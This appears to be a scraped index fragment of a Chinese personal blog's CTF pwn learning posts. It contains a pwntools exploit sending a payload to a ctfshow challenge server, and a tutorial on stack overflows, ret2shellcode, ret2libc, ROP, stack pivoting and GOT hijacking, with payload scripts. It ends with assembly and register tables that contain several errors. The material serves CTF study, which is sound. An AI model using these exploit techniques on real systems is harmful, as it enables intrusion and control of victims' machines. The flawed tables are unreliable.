context(log_level=\u0026#39;debug\u0026#39;, os = \u0026#39;linux\u0026#39;, arch = \u0026#39;i386\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28266) input_bss_address = 0x811EB40 binsh = 0x8049284 payload1 = cyclic(4) + p32(binsh) + p32(input_bss_address) payload = payload1.encode(\u0026#39;base64\u0026#39;) io.recvuntil(\u0026#39;:\u0026#39;) io.sendline(payload) io.interactive() PWN_077 题目：Ez ROP or Mid ROP ? PWN_077\n","date":"2025-08-27T00:00:00Z","headings":[{"id":"test_your_nc","level":2,"text":"Test_your_nc\n"},{"id":"前置基础","level":2,"text":"前置基础\n"},{"id":"栈溢出","level":2,"text":"栈溢出\n"},{"id":"pwn_000","level":3,"text":"PWN_000\n"},{"id":"pwn_001","level":3,"text":"PWN_001\n"},{"id":"pwn_002","level":3,"text":"PWN_002\n"},{"id":"pwn_003","level":3,"text":"PWN_003\n"},{"id":"pwn_004","level":3,"text":"PWN_004\n"},{"id":"pwn_005","level":3,"text":"PWN_005\n"},{"id":"pwn_006","level":3,"text":"PWN_006\n"},{"id":"pwn_007","level":3,"text":"PWN_007\n"},{"id":"pwn_008","level":3,"text":"PWN_008\n"},{"id":"pwn_009","level":3,"text":"PWN_009\n"},{"id":"pwn_010","level":3,"text":"PWN_010\n"},{"id":"pwn_011","level":3,"text":"PWN_011\n"},{"id":"pwn_012","level":3,"text":"PWN_012\n"},{"id":"pwn_013","level":3,"text":"PWN_013\n"},{"id":"pwn_014","level":3,"text":"PWN_014\n"},{"id":"pwn_015","level":3,"text":"PWN_015\n"},{"id":"pwn_016","level":3,"text":"PWN_016\n"},{"id":"pwn_017","level":3,"text":"PWN_017\n"},{"id":"pwn_018","level":3,"text":"PWN_018\n"},{"id":"pwn_019","level":3,"text":"PWN_019\n"},{"id":"pwn_020","level":3,"text":"PWN_020\n"},{"id":"pwn_021","level":3,"text":"PWN_021\n"},{"id":"pwn_021-1","level":3,"text":"PWN_021\n"},{"id":"pwn_023","level":3,"text":"PWN_023\n"},{"id":"pwn_024","level":3,"text":"PWN_024\n"},{"id":"pwn_025","level":3,"text":"PWN_025\n"},{"id":"pwn_026","level":3,"text":"PWN_026\n"},{"id":"pwn_027","level":3,"text":"PWN_027\n"},{"id":"pwn_028","level":3,"text":"PWN_028\n"},{"id":"pwn_029","level":3,"text":"PWN_029\n"},{"id":"pwn_030","level":3,"text":"PWN_030\n"},{"id":"pwn_031待定","level":3,"text":"PWN_031（待定）\n"},{"id":"pwn_032","level":3,"text":"PWN_032\n"},{"id":"pwn_033","level":3,"text":"PWN_033\n"},{"id":"pwn_034","level":3,"text":"PWN_034\n"},{"id":"pwn_035","level":3,"text":"PWN_035\n"},{"id":"pwn_036","level":3,"text":"PWN_036\n"},{"id":"pwn_037","level":3,"text":"PWN_037\n"},{"id":"pwn_038","level":3,"text":"PWN_038\n"},{"id":"pwn_039","level":3,"text":"PWN_039\n"},{"id":"pwn_040","level":3,"text":"PWN_040\n"},{"id":"pwn_041","level":3,"text":"PWN_041\n"},{"id":"pwn_042","level":3,"text":"PWN_042\n"},{"id":"pwn_043","level":3,"text":"PWN_043\n"},{"id":"pwn_044","level":3,"text":"PWN_044\n"},{"id":"pwn_045","level":3,"text":"PWN_045\n"},{"id":"pwn_046待定","level":3,"text":"PWN_046（待定）\n"},{"id":"pwn_047","level":3,"text":"PWN_047\n"},{"id":"pwn_048","level":3,"text":"PWN_048\n"},{"id":"pwn_049","level":3,"text":"PWN_049\n"},{"id":"pwn_050","level":3,"text":"PWN_050\n"},{"id":"pwn_051","level":3,"text":"PWN_051\n"},{"id":"pwn_052","level":3,"text":"PWN_052\n"},{"id":"pwn_053","level":3,"text":"PWN_053\n"},{"id":"pwn_054","level":3,"text":"PWN_054\n"},{"id":"pwn_055","level":3,"text":"PWN_055\n"},{"id":"认识32位和64位的shellcode","level":3,"text":"认识32位和64位的shellcode\n"},{"id":"pwn_056","level":3,"text":"PWN_056\n"},{"id":"pwn_057","level":3,"text":"PWN_057\n"},{"id":"pwn_058","level":3,"text":"pwn_058\n"},{"id":"pwn_059","level":3,"text":"PWN_059\n"},{"id":"pwn_060","level":3,"text":"PWN_060\n"},{"id":"pwn_061","level":3,"text":"PWN_061\n"},{"id":"pwn_062","level":3,"text":"PWN_062\n"},{"id":"pwn_063","level":3,"text":"PWN_063\n"},{"id":"pwn_064","level":3,"text":"PWN_064\n"},{"id":"pwn_065","level":3,"text":"PWN_065\n"},{"id":"pwn_066","level":3,"text":"PWN_066\n"},{"id":"pwn_067待定","level":3,"text":"PWN_067*（待定）\n"},{"id":"pnw_068待定","level":3,"text":"PNW_068（待定）\n"},{"id":"pwn_069","level":3,"text":"PWN_069\n"},{"id":"pwn_070","level":3,"text":"PWN_070\n"},{"id":"pwn_071","level":3,"text":"PWN_071\n"},{"id":"pwn_072","level":3,"text":"PWN_072\n"},{"id":"pwn_073","level":3,"text":"PWN_073\n"},{"id":"pwn_074","level":3,"text":"PWN_074\n"},{"id":"pwn_075","level":3,"text":"PWN_075\n"},{"id":"pwn_076","level":3,"text":"PWN_076\n"},{"id":"pwn_077","level":3,"text":"PWN_077\n"}],"image":"https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow_hu_677537c56386674a.png","permalink":"https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/","title":"CTFshow-入门PWN-writeup"},{"content":"前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！\n[TOC]\n继上一大章的基础学 习后，对PWN有了一定了解，知道一些专名词、一些保护机制的工作流程、汇编语言等，接下来的几章开始正式学习二进制的漏洞利用和原理。\n栈是PWN比较常见的突破点\n栈溢出原理 在上一大章的函数调用约定中，我们可以了解到函数的调用过程： 调用函数：只需要将rip压栈，即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。\n被调用函数：push rbp； mov rbp rsp；sub rsp oxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用,此时rbp就变成了被调用函数的栈底。\n函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧，返回调用函数的返回地址。\n栈的作用为存储函数调用相关信息以及函数的局部变量。\n这些局部变量通常为数组或者输入的缓冲区（buf）。而函数调用相关的信息，主要是返回地址和栈底指针（rbp）。\n栈溢出 函数中的存储在找中的局部变量数组边界检查不严格发生越界写，造成用户输入覆盖到缓冲区外的数据内容。\n由于栈中同时存在着与函数调用参数的相关信息，栈溢出可以导致控制流劫持。\n来让我解释一下：\n若用户输入长度超过数组容量，超出的部分会向上覆盖栈中更高地址的数据（因为栈向下生长，越界写会向高地址蔓延）； 当覆盖到 “返回地址” 时，攻击者可以将其修改为任意地址（如 shellcode 地址、ROP gadget 地址等）； 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;unistd.h\u0026gt; // 包含read函数声明 // 存在漏洞的函数：读取200字节到80字节的缓冲区 void func_a() { char buf[80]; // 局部变量：80字节的数组 read(0, buf, 200); // 从标准输入读取200字节到buf（无长度检查，必然溢出） return; } // 调用func_a的函数 void func_b() { func_a(); // 调用漏洞函数 int c; // 局部变量c c = 1; // 给c赋值 return; } // 主函数 int main() { func_b(); // 调用func_b int a; // 局部变量a a = 2; // 给a赋值 return 0; } main函数调用b，b函数调用a。缓冲区溢出发生在a函数中。\nbuf的长度为80，但是却读入了200长度。（栈溢出）\n分析程序运行至a时的栈帧、栈中存放buf和返回地址等等信息： 输入200长度造成栈溢出，超出的 120 字节会向上覆盖栈中更高地址的内容如ret（因为栈向下生长，越界写会向高地址蔓延）。\n覆盖返回地址可以控制程序下一步执行的位置，而通过控制执行位置，攻击者可以间接实现 “修改任意地址” 的效果。\n举例，攻击者构造输入：前 84 字节填充无关数据（覆盖buf和func_b()的 ebp），第 85~88 字节填入0x12345678（小端序可能需要反写为0x78563412）；这时返回地址被覆盖成0x12345678，直接跳转到0x12345678（可能是攻击者的代码）。\n那说起返回地址这一块，回忆一下：\n调用函数：只需要将rip压栈，即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。\n被调用函数：push rbp；mov rbp rsp; sub rsp oxxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时rbp就 变成了被调用函数的栈底。\n函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧，返回调用函数的返回地址。\n栈溢出的核心是覆盖程序中 “会被用来决定下一步执行位置” 的数据，这些数据未必是ret指令读取的 “返回地址”。如果栈中存在被jmp、call等指令使用的 “目标地址”（比如函数指针、跳转表项等），覆盖这些地址同样能实现控制流劫持。\n具体来说：ret、jmp、call的共性与差异：\nret指令：从栈中读取 “返回地址” 并跳转（依赖栈中存储的地址） call 地址指令：将当前指令的下一条地址压栈，然后跳转到 “地址”（若 “地址” 存储在栈中且可被覆盖，则call的目标会被篡改） jmp 地址指令：直接跳转到 “地址”（若 “地址” 存储在栈中且可被覆盖，则jmp的目标会被篡改） 只要这些指令依赖的 “目标地址” 存储在栈中，且能被栈溢出覆盖，就能劫持控制流。ret只是最常见的场景（因为函数调用的返回地址几乎必然在栈上），而jmp/call的目标若在栈上，同样可以被利用。\n总之：栈溢出的原理就是栈中存储的局部变量数组发生溢出，覆盖了栈中的其他数据。将返回地址覆盖为我们期望的目标地址，即可劫持控制流。\n栈溢出在CTF中的应用 一般来说，在CTF中的PWN，多数情况下我们需要让程序执行这一段代码： system(\u0026quot;/bin/sh\u0026quot;)\n也就是说在远程机器上开一个命令行终端，这样我们就可以通过命令行来控制目标机器。\n通常来说，CTF比赛中只需要开启命令行后读flag(cat flag）。\n基本栈溢出 如果程序中没有system这样的代码出现，怎么办？我们可以自己写shellcode！\n**shellcode**就是一段可以独立开启shell的一段汇编代码。\nret2shellcode的思路就是：\n如果程序中存在让用户向一段长度足够的缓冲区中输入数据。我们向其中输入shellcode，将程序劫持到shellcode上即可。当然，这种也是理想情况。\nret2shellcode是二进制漏洞利用中的一种常见技术，用于在存在栈溢出等漏洞的程序中获取系统的 shell 权限，从而执行任意命令。ret2shellcode利用这个特性，将返回地址覆盖为一段精心构造的机器码（即 shellcode）的地址，从而返回到攻击者留下的shellcode进行劫持。\n栈溢出案例：ret2shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026#34;stdlib.h\u0026#34; #include \u0026#34;stdio.h\u0026#34; #incldue \u0026#34;unistd.h\u0026#34; char global_buf[200]; void gen_shell() { execv(\u0026#34;/bin/sh\u0026#34;,0); puts(\u0026#34;wow\u0026#34;); return ; } void vul() { char buf[80]; write(1,\u0026#34;input:\u0026#34;,6); read(0,buf,200); puts(\u0026#34;done\\n\u0026#34;); return ; } int main() { mpritect(0x404000,1000,7); setvbuf(stdout,0,2,0); setvbuf(stdin,0,1,0); printf(\u0026#34;gen_shell:0x%x\\n\u0026#34;,(unsigned)\u0026amp;gen_shell); printf(\u0026#34;global_buf:0x%x\\n\u0026#34;,(unsigned)\u0026amp;global_buf); write(1,\u0026#34;global:\u0026#34;,7); read(0,global_buf,200); vul(); puts(\u0026#34;goodbye!\u0026#34;); return 0; } vul函数存在明显的栈溢出，可以劫持控制流到gen_shell函数、可以劫持控制流到global_buf。\n局部变量buf[80]仅分配 80 字节，但read(0, buf, 200)读取 200 字节输入，超出的 120 字节会覆盖栈中更高地址的数据（包括ebp和返回地址），属于典型的栈溢出漏洞。\n方法一：生成payload脚本劫持 vul()函数中，buf[80]是局部变量，栈布局从低到高为：buf[0..79] → ebp（4 字节，32 位系统） → 返回地址（4 字节）。\n覆盖返回地址需要先填充：80字节（buf） + 4字节（覆盖ebp），之后的 4 字节就是要写入的返回地址（即gen_shell的地址）。\n构造攻击数据（以 Python 为例）：\n1 2 3 # 假设gen_shell地址为0x401120，小端序为b\u0026#39;\\x20\\x11\\x40\\x00\u0026#39; payload = b\u0026#39;A\u0026#39;*80 + b\u0026#39;B\u0026#39;*4 + b\u0026#39;\\x20\\x11\\x40\\x00\u0026#39; print(payload) # 输出到程序输入 输入攻击数据后，vul()函数执行return时，返回地址已被覆盖为0x401120，程序会跳转到gen_shell函数，执行execv(\u0026quot;/bin/sh\u0026quot;, 0)，成功获取 shell。\n方法二：利用栈溢出跳转到shellcode 构造 payload 覆盖 vul() 函数的返回地址为 global_buf 的地址（即 shellcode 所在位置）\u0026hellip;\u0026hellip;\nret2libc 有时候，我们需要调用一些系统函数，就比如说system或者execv等。程序中可能不会提供一些现成的函数。\n如果我们拿到了libc中函数的地址，我们可以直接调用libc中的函数，只需要传递好参数，然后call即可。\n如何传参？如何调用system(/bin/sh)？\n只需要将rdi设置为/bin/sh字符串地址，然后call system即可。\n如何设置mov？\n如果直接mov，然后call，那么就和ret2shellcode无异。\n现在问题是，我们只有一个libc地址和/bin/sh字符串地址，以及一个栈溢出漏洞，怎么传递参数？\npop rdi ret + /bin/sh地址 + system\n来个例子：有一个存在栈溢出的 64 位程序 vuln\n有一个漏洞函数 vul()，存在栈溢出（可覆盖返回地址）；\n程序加载了 libc 库（必然包含 system 函数）；\n我们通过信息泄露已经获取到：\nsystem 函数在内存中的地址：0x7ffff7839410 \u0026quot;/bin/sh\u0026quot; 字符串在内存中的地址：0x7ffff79e5aaa 一个 pop rdi; ret gadget 的地址：0x401273（从程序中找到） 经调试，覆盖 vul() 函数返回地址需要先填充 120 字节（前 120 字节会覆盖局部变量和 rbp）。\n函数的第一个参数通过 rdi 寄存器传递。因此调用 system(\u0026quot;/bin/sh\u0026quot;) 必须满足：\nrdi 寄存器中存放 \u0026quot;/bin/sh\u0026quot; 字符串的地址（0x7ffff79e5aaa）；\n程序跳转到 system 函数的地址（0x7ffff7839410）执行。\n通过栈溢出构造 payload，最终让程序执行 system(\u0026quot;/bin/sh\u0026quot;)，获取 shell。\n用 Python 代码生成 payload（pwntools）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pwn import * # 构造 payload offset = 120 # 覆盖到返回地址的偏移量 pop_rdi_ret = 0x401273 # pop rdi; ret gadget 地址 bin_sh_addr = 0x7ffff79e5aaa # \u0026#34;/bin/sh\u0026#34; 地址 system_addr = 0x7ffff7839410 # system 函数地址 payload = ( b\u0026#39;A\u0026#39; * offset # 填充偏移 + p64(pop_rdi_ret) # 放入 gadget 地址 + p64(bin_sh_addr) # 放入参数地址（给 rdi） + p64(system_addr) # 放入 system 地址（跳转执行） ) # 发送 payload 到程序（假设通过管道连接） p = process(\u0026#39;./vuln\u0026#39;) p.sendline(payload) p.interactive() # 交互获取 shell ret2libc 调用 system(\u0026quot;/bin/sh\u0026quot;) 的核心逻辑是：\n用 pop rdi; ret 把栈中的 \u0026quot;/bin/sh\u0026quot; 地址 “搬” 到 rdi 寄存器，再跳转到 system 函数。\n整个过程完全依赖栈溢出控制程序执行顺序，不需要程序中存在现成的 shell 函数，也不需要栈可执行，因此适用性极强。\n在这里开始就需要刷点PWN题了，我比较推荐的是ctfshow，购买官网套餐或者去咸鱼上买网盘保存的ctfshow-pwn题也行，看自己预算，在这里我就会同步进行writeup_pwn的编写了。\nROP 前传 ROP（Return-Oriented Programming，返回导向编程）是一种高级漏洞利用技术，主要用于在内存保护机制（如 NX/DEP，即代码段不可执行）限制下，通过拼接程序中已有的代码片段（称为 “gadget”）来构造攻击逻辑，实现对程序的控制。\n很多情况下，程序中我们能够利用的只有栈。也就是说，程序中没有一个可读可写可执行的区域让我们输入shellcode。同时，大多数题目也不会那么好心给你留一个后门函数直接执行system。那么这个时候，我们就要利用ROP。我们不能运行shellcode，也没有后门函数一步到位。我们可以利用程序中的一些指令片段，一点点拼接起来，拼成我们想要的样子。怎么拼？\n拿system(\u0026quot;“/bin/sh\u0026quot;);举例：\n我们要将rdi改成/bin/sh这个字符串的地址，然后call system。不能执行shellcode，怎么改？我们有栈（传递参数）! pop rdi ret + /bin/sh addr\n不能shellcode，怎么call？我们有ret! 所以，我们构造的payload就是： padding + pop rdi; ret + /bin/sh + system\nROP就是搭积木，用一个个小小的片段来完成复杂的工作，基本只需要用到栈这些小小的积木，我们称之为gadget怎么找gadget呢?\nropper \u0026amp; ROPgadgets（自行安装）可以帮我们寻找\n1 ROPgadget --binary file 如果要找特定寄存器或者返回值，可以在后面加，比如图的指令:\n来个例子：\nread(0,buf,200);向buf上写数据（/bin/sh），buf地址已知；system(buf);即执行system(\u0026quot;/bin/sh\u0026quot;)；\n1 2 3 4 5 6 mov rdi 0; //第一个参数0 mov rsi buf; //第二个参数 buf地址 mov rdx 200; //第三个参数，写入的长度 call read; //调用read mov rdi buf; //第一个参数 buf地址 call system; ROP传参：\n1 2 3 4 5 6 7 8 9 10 pop rdi;ret； 0 pop rsi;ret; buf pop rdx;ret； 200 read pop rdi;ret; buf system； 很抽象？那我们可以看回这个例子：\n看到里面的一些地址pop rdi;ret之类的，再看回上面的，你就能读懂是什么意思。\n但是在实际情况下，并不一定有像之前举的例子一样的gadget供我们使用，有时候我们需要一个gadget,比如poprsi；ret,程序中不一定会有，这时候就需要调动我们的思维能力，曲线救国，通过别的方式来完成ROP。\n通用ROP： 在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。\n这时候，我们可以利用x64下的libc_csu_init 中的gadgets。\n这个函数是用来对libc 进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。\n本章的ROP介绍到这啦。\nROP++ 通过之前的认识，我们发现ROP形式上把代码片段分散在程序代码中。ROP通过栈来维护整个链的逻辑。 但如果栈溢出字节不够怎么办？\n思路一：one punch!\nlibc中有没有这么一段代码，直接就运行system(“/bin/sh”)呢？这样我们就不需要传递参数，直接将返回地址覆盖到那里就好了。 答案是：有，而且不止一个。这种一步到位的gadget，我们称之为one gadget。\n看起来像梭哈的，很方便喔！但是又局限性的，\n师傅，那我还学什么ROP，直接每次一步到位不就得了？想法总是好的，但是现实是很差强人意的。 onegadget通常有变量要求，比如栈中的某个偏移处值必须为0，rax必须为0。所以说，onegadget这个东西，比较玄学，不靠谱。\n思路二：没条件创造条件\n计算机是怎么知道栈的？答：通过rbprsp\nROP怎么维护逻辑的?答：通过一系列的pop和ret操作，依靠rsp。\n溢出字节不够，rop写不完，rsp一条路走到黑，一顿popret操作后跑到了我们溢出控制区域外。\n问题归纳总结：溢出字节不够只是原因，我们的目的是让rsp在我们能够控制的区域自由飞翔。\n栈转移/栈迁移 只要控制rsp一直在我们可控制内容的区域，就可以完成rop。那么，如何控制RSP?其实就是mov rsp XXX 这种效果。有没有mov rsp rax；ret，或者pop rsp；ret这种gadgets呢?理论上应该有的，但是实际情况下极其少见。那么，除了push和pop，还有没有其他常见指令能对rsp值进行更改呢?\n那就是leave ret，leave指令的实际效果就是mov rsprbp; pop rbp；用于恢复栈帧，通常与ret连用。 这里我们可以看到，leave将rbp的值符给了rsp。 也就是说我们控制了rbp指针，就可以控制rsp。\n栈转移第一种方法 pop rbp; ret+ leave; ret\nrop的构成：\n1 2 3 pop rbp;ret; target stack address leave;ret; 首先利用pop rbp ret来控制rbp指针的值为我们想要将栈转移到的地址，然后执行leave；ret来控制rsp指针。\n我们计算一下总共溢出的字节，pop rbp； ret的地址为返回地址，后续的所需要的溢出字节数仅仅为16字节，如果算上溢出覆盖到的rbp指针和返回地址， 那么一共是32字节。然后栈转移到我们目标的地址上继续执行rop。\n栈转移第二种方法 两次leave ret\nrop构成：\n1 2 3 target stack address leave ret; leave ret; 这种方式与上一种方式大同小异，但是我们需要将栈上保存的rbp（也就是返回地址之前）改成迁移的地址。程序在第一次执行leave ret时，会将rbp搞到目标迁移地址上。再次执行leave ret时，效果就和之前一样了。\n那么溢出字节仅仅需要8个字节，算上覆盖的rbp以及返回地址，一共需要24字节溢出。\n如果我们溢出的函数本身结尾带有leave；ret，那么我们只需要溢出16字节，只需要覆盖到返回地址即可。\n总之，栈转移通过将 rsp 指向可控区域，解决了以下问题：\n原始栈空间不足，无法构造长 ROP 链； 利用堆或其他可写区域（如 .bss 段）作为新栈，绕过栈保护机制； 串联多个分散的 gadget，实现复杂攻击逻辑（如调用 execve 或泄露 libc 地址）。 其本质是利用 leave 指令对 rbp 和 rsp 的关联关系，通过控制 rbp 间接 “劫持” 栈指针，是 ROP 进阶利用中的关键技术。\n改写.got表getshell方法 我们思考一下，程序调用函数都是通过访问got表。 如果我们将.got表中原本存放比如说puts函数的地址，改成system函数的地址，这样程序想要调用puts时，实际调用的却是system，利用这种方式getshell，不是很好吗？\n这种方式叫做got表劫持，是一种间接控制程序执行流的方式。\nGOT的地址，在没开PIE的情况下，我们可以在IDA中查看，也可以用pwntools指令查询：elf.GOT[\u0026ldquo;puts\u0026rdquo;]\n在我们劫持got表时，常见的有如下几种： puts(buf)、atoi(buf)、atol(buf)、free(buf)\nfree在当前阶段少见，在后续的堆会很常见。\n总的来说，把这些第一个参数也就是rdi指针指向我们可以控制输入的区域的函数，改成system，这样，当我们程序执行到调用这些函数时，程序就被劫持到我们目标函数处了。\n如何改写？\nROP: read (0, got, size)；\n达到任意内存地址写后，不能确定栈地址，考虑写got。\nbss等段越界访问(负值)。\n主要看程序逻辑，具体问题具体分析。\nPWN栈溢出题的一般解题思路 直接控制执行流：shellcode \u0026amp;ROP\n间接控制执行流：改写函数指针，如got表。\n保护机制绕过：canary、ASLR、PIE\n方法论\n第一步、查看文件信息（checksec看架构、保护信息） 一般来说，栈题目都会或多或少关闭一些保护。 如果关了canary，那么大概率是栈题。如果开启了PIE，那么就需要找个地方泄漏地址信息。如果开启了 FULL RELRO，那么思路就不应该是改写got。\n第二步、理清函数逻辑（如何执行？） 直接在linux中运行，丢进ida，静态分析。\n首先把函数名、变量等等搞成自己看得懂的地步。如果有结构体，最好花时间建一个结构体,这样之后分析省事。\n第三步、找到漏洞（栈？堆？gets函数、system、execv） 找漏洞是很考验经验的。\n一般先分析一下危险函数，比如gets、read、write、free、printf等等。 很多PWN题目会自己封装一个input函数,重点分析一下，看看有没有越界。 分析的时候也有技巧，通常我们要看看我们的输入数据会被程序如何处理。\n由于pwn多数是内存破坏漏洞，所以对于内存拷贝等函数要格外注意。\n第四步、漏洞利用（写exp、payload） 基本上找到漏洞工作就完成了一半。 漏洞利用和程序本身的逻辑以及保护机制息息相关。通常来说，需要解决以下几个问题：\n地址问题 我们编写EXP离不开函数地址以及gadgets地址。\n开启了PIE和ASLR，我们就需要想办法泄漏地址。\n泄漏方法一般就是让程序打印出来一些脏数据或者函数地址。\n程序基地址、堆地址、Iibc基地址、栈地址。\ncanary和NX问题 如果确定是栈题，并且有canary，那么通常考虑泄漏或者修改canary。一般来说，NX都是开启的，没有开启就说明要你执行shellcode了。\nNX对于我们写ROP基本没影响，绕过方法也很简单：mprotect\n程序本身的限制 gadget种类少、输入字符有限制、栈溢出字节不够、具体情况具体分析。\n完结 栈的讲解就到这，可能内容比较少，概念抽象些，也是怪小生基础不牢理解力不够强😄，还得区看看PWB题加强一下。\n","date":"2025-08-25T00:00:00Z","headings":[{"id":"栈溢出原理","level":2,"text":"栈溢出原理\n"},{"id":"基本栈溢出","level":2,"text":"基本栈溢出\n"},{"id":"rop-前传","level":2,"text":"ROP 前传\n"},{"id":"rop","level":2,"text":"ROP++\n"},{"id":"改写got表getshell方法","level":2,"text":"改写.got表getshell方法\n"},{"id":"pwn栈溢出题的一般解题思路","level":2,"text":"PWN栈溢出题的一般解题思路\n"},{"id":"完结","level":2,"text":"完结\n"},{"id":"栈溢出","level":3,"text":"栈溢出\n"},{"id":"栈溢出在ctf中的应用","level":3,"text":"栈溢出在CTF中的应用\n"},{"id":"栈溢出案例ret2shellcode","level":3,"text":"栈溢出案例：ret2shellcode\n"},{"id":"ret2libc","level":3,"text":"ret2libc\n"},{"id":"栈转移栈迁移","level":3,"text":"栈转移/栈迁移\n"},{"id":"第一步查看文件信息checksec看架构保护信息","level":3,"text":"第一步、查看文件信息（checksec看架构、保护信息）\n"},{"id":"第二步理清函数逻辑如何执行","level":3,"text":"第二步、理清函数逻辑（如何执行？）\n"},{"id":"第三步找到漏洞栈堆gets函数systemexecv","level":3,"text":"第三步、找到漏洞（栈？堆？gets函数、system、execv）\n"},{"id":"第四步漏洞利用写exppayload","level":3,"text":"第四步、漏洞利用（写exp、payload）\n"}],"image":"https://expl0rer.top/p/pwn-2/PWN2_hu_2d4ab7854696bd7b.png","permalink":"https://expl0rer.top/p/pwn-2/","title":"PWN-2"},{"content":"[TOC]\n前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！\nCTF是什么？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式。\nCTF比赛形式主要为线上解题（jeopardy）和线下攻防（Attack With Defence）\n线上赛题目大致方向有WEB、RE、PWN、MISC、CRYPTO，解出flag交给服务器验证通过才得分。\nPWN简介 Pwn是什么？\n\u0026ldquo;Pwn\u0026quot;是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音一研的一声，被“黑”的电脑或手机就被你操纵了。CTF中的PWN主要是针对于二进制漏洞挖掘与利用，通常情况下选手需要对于一个有漏洞的可执行文件进行分析，找到漏洞，然后利用漏洞读取远程服务器上的FLAG。\nPwn传统出题方向：glibc PWN：堆、栈、shellcode编写、iofile等。进阶：arm架构、loT、内核、vm、浏览器等。\n所需工具：pwntools、pwndbg、IDA、虚拟机（Ubuntu或Kali）、LibcSearcher、ropper\u0026amp;ROPgadgets、one_gadget、Ruby\n实际生活中我们会遇到的pwn：\n泄露通信数据：心脏滴血（cve-2014-0160）\nLinux本地提权root：脏牛dirty cow（cve-2016-5195）\nWannacry：永恒之蓝勒索病毒\nPWN入门劝退集\u0026hellip;\u0026hellip;\n汇编语言基础 我自己在打ctf逆向和pwn，也时常搞不懂bit和byte，在这里我先把一些计算机内的量词回忆一下：\n名称 翻译 大小 bit 比特 1位（1b） byte 字节 8位（1B） word 字 16位 dword 双字 32位 qword 四字 64位 计算机寻址方式\n在当前主流的操作系统中，都是以字节（B）为寻址单位进行寻址。\n意味着计算机访问的最小单位是一个字节（B）。\n类比于人口普查，普查员以每户（B)为单位统计，而不是访问到个人（b）。\n寄存器 计算机的指令都是由CPU来执行。\n在计算机系统结构中，CPU和内存是分开的。\n寄存器存在于CPU中，是CPU的直接操作对象。\n寄存器名称 作用 备注 RAX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RBX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RCX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RDX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RDI 通用寄存器 低32位：EDI RSI 通用寄存器 低32位：EDI R8 通用寄存器 低32位：EDI R9 通用寄存器 低32位：EDI R10 通用寄存器 低32位：EDI R11 通用寄存器 低32位：EDI R12 通用寄存器 低32位：EDI R13 通用寄存器 低32位：EDI R14 通用寄存器 低32位：EDI R15 通用寄存器 低32位：EDI RSP 栈顶指针 低32位：ESP RBP 栈底指针 低32位：ESP EFLAGS 标志寄存器 记录标志状态，包括AF、PF、SF、ZF、OF、CF等标识位 RIP 指令计数器 保存下一条将会执行的指令的地址 上述的通用寄存器，通常用于参数传递以及算数运算等通用场合。\nRSP为栈顶指针，RBP为栈底指针，二者用于维护程序运行时的函数栈，在之后的调用约定一节会对其进行讲解。\nEFLAGS为标志位寄存器，用于存储CPU运行计算过程中的状态，如进位溢出等。\nRIP指针用于存储CPU下一条将会执行的指针，不能直接修改,正常情况下会每一次运行一条指令自增一条指令的长度，当发生跳转时才会以其他形式改变其值。\nCPU的寻址方式 学过C语言都知道指针，它是一个变量，它存储的是另一个变量的内存地址，而不是直接存储数据本身。这里解释的是比较含糊，详细的还请搜索引擎。\n寻址方式 示例 实际访问 立即寻址 1234h 1234h这个数字本身 直接寻址 [1234h] 内存地址1234h 寄存器寻址 RAX 访问RAX寄存器 寄存器间接寻址 [RAX] 访问RAX寄存器存储的值的这一内存地址 变址寻址 [RAX+1234h] 访问RAX寄存器存储的值+1234h这一内存地址 汇编指令 指令类型 操作码 例子（Intel格式） 实际效果 数据传送指令 mov mov rax rbx rax = rbx 取地址指令 lea lex rax [rbx] rax =\u0026amp;*rbx 算数运算指令+ add add rax rbx rax = rax + rbx - sub sub rax rbx rax = rax - rbx 逻辑运算指令 and and rax rbx rax = rax\u0026amp;rbx xor xor rax rbx rax = rax | rbx 函数调用指令 call call 1234h 执行内存地址1234h处的函数 函数返回指令 ret ret 函数返回 比较 cmp cmp rax rbx 比较rax与rbx，结果保存在EFLAG寄存器 无条件跳转 jmp jmp 1234h eip = 1234h 栈操作指令 push push rax 将rax存储的值压栈 pop pop rax 将栈顶的值赋值给rax，rsp+=8 